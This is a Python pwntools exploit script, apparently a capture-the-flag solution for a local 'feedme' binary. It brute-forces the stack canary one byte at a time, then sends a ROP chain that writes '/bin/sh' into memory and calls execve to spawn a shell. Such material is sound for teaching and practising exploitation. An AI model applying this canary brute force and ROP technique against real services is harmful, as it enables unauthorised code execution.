from pwn import *

target = process('./feedme')

popEax = p32(0x080bb496)
popEdx = p32(0x0806f34a)
popEcxEbx = p32(0x0806f371)
mov = p32(0x0807be31)
syscall = p32(0x08049761)


# Here is the function to brute force the canary
def breakCanary():
    # We know that the first byte of the stack canary has to be \x00 since it is null terminated, keep the values we know for the canary in known_canary
    known_canary = bytes([0])
    # The current canary which will be incremented
    canary = 0x0
    # The number of bytes we will give as input
    inp_bytes = 0x22
    # Iterate 3 times for the three bytes we need to brute force
    for j in range(0, 3):
        # Iterate up to 0xff times to brute force all posible values for byte
        for i in range(0xff):
            byte_num = bytes([p32(inp_bytes)[0]])

            # Send the current input size
            target.send(byte_num)

            tmp_canary = known_canary + bytes([canary])

            # log.info(f'sending {byte_num} bytes: {tmp_canary}')

            # Send this iterations canary
            target.send(bytes([0]*0x20) + tmp_canary)

            # Scan in the output, determine if we have a correct value
            output = target.recvuntil('exit.').decode('utf-8')
            if 'YUM' in output:
                known_canary = tmp_canary
                inp_bytes = inp_bytes + 1
                canary = 0x0
                log.info(f'known_canary: {known_canary}')
                break
            else:
                # If this isn't the canary value, increment canary by one and move onto next loop
                canary = canary + 0x1

    # Return the canary
    return known_canary


# Brute force the canary
canary = breakCanary()
log.info(f'Canary is {canary}')
payload = bytes([0]*0x20) + canary
payload += bytes([1]*0xc)

# first write '/bin' at 0x80eb928
payload += popEax
payload += p32(0x80eb928) # bss address
payload += popEdx
payload += p32(0x6e69622f) # /bin string in hex, in little endian
payload += mov

# then write '/sh' at 0x80eb928+4
payload += popEax
payload += p32(0x80eb928 + 0x4) # bss address
payload += popEdx
payload += p32(0x0068732f) # /sh string in hex, in little endian
payload += mov

# then call syscall
payload += popEax
payload += p32(0xb) # 11
payload += popEcxEbx
payload += p32(0x0) # for ecx
payload += p32(0x80eb928) # for ebx, address to /bin/sh
payload += popEdx
payload += p32(0x0)
payload += syscall


# Send the amount of bytes for our payload, and the payload itself
target.send("\x78")
target.send(payload)

# Drop to an interactive shell
target.interactive()